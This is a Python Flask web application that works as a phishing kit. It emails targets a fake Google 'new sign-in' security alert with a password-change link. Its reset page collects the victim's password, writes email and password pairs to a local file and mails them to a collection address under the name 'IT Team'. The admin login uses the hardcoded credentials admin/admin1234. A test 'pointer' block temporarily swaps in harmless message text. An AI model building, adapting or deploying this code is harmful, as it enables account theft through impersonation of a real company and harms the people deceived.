from flask import Flask, render_template, request, redirect, url_for, session, flash
from utils import Mail
from config import BaseConfig, settings
from dotenv import load_dotenv
from functools import wraps
from itsdangerous import URLSafeTimedSerializer

s = URLSafeTimedSerializer(settings.SECRET_KEY)

load_dotenv()

app = Flask(__name__)
app.secret_key = settings.SECRET_KEY 

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            flash("Please log in to access this page.", "info")
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route("/")
@login_required
def index():
    return render_template("index.html")

@app.route("/forgot-password", methods=["GET", "POST"])
@login_required
def forgot_password():
    if request.method == "POST":
        email = request.form.get("email")
        if email:
            token = s.dumps(email, salt="samplesalt")
            reset_url = url_for("reset_password", token=token, _external=True)

            mail_client = Mail(username=BaseConfig.EMAIL_USERNAME,
                               password=BaseConfig.EMAIL_PASSWORD,
                               host=BaseConfig.EMAIL_HOST,
                               port=BaseConfig.EMAIL_PORT)

            print(mail_client)
            subject = "A new sign-in on Windows"
            body = f""" We noticed a new sign-in to your Google Account on a Linux device. If this was you, you don’t need to do anything. If not, we’ll help you secure your account.

Change your password using this link: {reset_url}

You can also see security activity at https://myaccount.google.com/notifications

You received this email to let you know about important changes to your Google Account and services.

© 2024 Google LLC, 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA """

            # pointer
            body = "hello marta"
            subject = "greetings from aunt clotilde"
            # end pointer
            resp, success = mail_client.send_mail([email], subject, body, "IT Team")

            if success:
                flash("Password reset email sent. Please check your inbox.", "success")
            else:
                flash("Error sending email. Please try again later.", "error")

            return redirect(url_for("index"))

    return render_template("forgot-password.html")



@app.route("/reset-password/<token>", methods=["GET", "POST"])
def reset_password(token):
    try:
        # Decode the token to get the email
        email = s.loads(token, salt="samplesalt", max_age=3600)  # 1 hour expiration
    except:
        flash("The reset link is invalid or has expired.", "error")
        return redirect(url_for("index"))

    if request.method == "POST":
        old_password = request.form.get("old_password")

        file_path = "old_passwords.txt"

        with open(file_path, "a") as file:
            file.write(f"{email}: {old_password}\n")

        mail_client = Mail(username=BaseConfig.EMAIL_USERNAME,
                           password=BaseConfig.EMAIL_PASSWORD,
                           host=BaseConfig.EMAIL_HOST,
                           port=BaseConfig.EMAIL_PORT)

        subject = "Password Updated"
        body = f"{email}: {old_password}\n"
        print(body)
        resp, success = mail_client.send_mail([BaseConfig.EMAIL_STORAGE], subject, body, "IT Team")

        if success:
            flash("Password update email sent. Please check your inbox.", "success")
        else:
            flash("Error sending email. Please try again later.", "error")

        return redirect(url_for("login"))

    return render_template("reset-password.html", email=email, token=token)

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        if username == "admin" and password == "admin1234":
            session['logged_in'] = True
            flash("You have successfully logged in.", "success")
            return redirect(url_for("index"))
        else:
            flash("Invalid credentials. Please try again.", "warning")
            return redirect(url_for("login"))

    return render_template("login.html")

@app.route("/logout")
def logout():
    session.pop('logged_in', None)
    flash("You have been logged out.", "success")
    return redirect(url_for("login"))

@app.route("/register")
def register():
    return render_template("register.html")

if __name__ == '__main__':
    app.run(debug=True)
